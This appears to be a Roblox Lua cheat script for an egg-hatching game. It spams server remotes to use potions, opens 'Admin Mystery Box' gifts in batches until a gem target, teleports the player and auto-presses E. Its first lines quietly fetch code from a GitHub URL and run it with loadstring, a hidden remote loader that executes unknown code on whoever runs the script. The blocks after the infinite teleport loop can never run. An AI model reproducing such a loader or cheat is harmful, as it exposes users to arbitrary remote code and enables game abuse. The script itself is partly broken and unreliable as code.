task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/malikstt/script/main/test2"))()
end)
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local RemoteModule = require(ReplicatedStorage.Shared.Framework.Network.Remote)
local RemoteEvent = ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent
local LocalDataModule = require(ReplicatedStorage.Client.Framework.Services.LocalData)

local TARGET_GEMS = 1000000
local BOX_NAME = "Admin Mystery Box"
local BATCH_SIZE = 50
local WAIT_TIME = 2.5
local POTION_DURATION = 30

local function getLocalData()
    return LocalDataModule:Get()
end

local potions = {
    {"Speed", 7},
    {"Speed", 6},
    {"Lucky", 7},
    {"Lucky", 6},
    {"Egg Elixir", 1},
    {"Mythic", 7},
    {"Mythic", 6},
    {"Infinity Elixir", 1},
}

local potionIndex = 1
local potionStart = tick()
local potionsDone = false

local potionConnection
potionConnection = RunService.Heartbeat:Connect(function()
    if tick() - potionStart >= POTION_DURATION then
        potionsDone = true
        potionConnection:Disconnect()
        return
    end

    local potion = potions[potionIndex]
    if potion then
        RemoteEvent:FireServer("UsePotion", potion[1], potion[2])
    end

    potionIndex += 1
    if potionIndex > #potions then
        potionIndex = 1
    end
end)

local boxesDone = false

while true do
    local data = getLocalData()
    local gems = data and data.Gems or 0

    if gems >= TARGET_GEMS then
        break
    end

    local powerups = data and data.Powerups or {}
    local amount = powerups[BOX_NAME] or 0

    if amount <= 0 then
        break
    end

    RemoteModule:FireServer(
        "UseGift",
        BOX_NAME,
        math.min(BATCH_SIZE, amount)
    )

    task.wait(WAIT_TIME)
end

boxesDone = true

repeat task.wait() until potionsDone and boxesDone

while true do
    local char = game.Players.LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if hrp then
        hrp.CFrame = CFrame.new(132.47, 9.73, 97.12)
    end
    task.wait(60)
end

pcall(function()
    require(ReplicatedStorage.Client.Effects.HatchEgg).Play = function() end
end)

local vim = game:GetService("VirtualInputManager")
while true do
    vim:SendKeyEvent(true, Enum.KeyCode.E, false, game)
    vim:SendKeyEvent(false, Enum.KeyCode.E, false, game)
    task.wait()
end
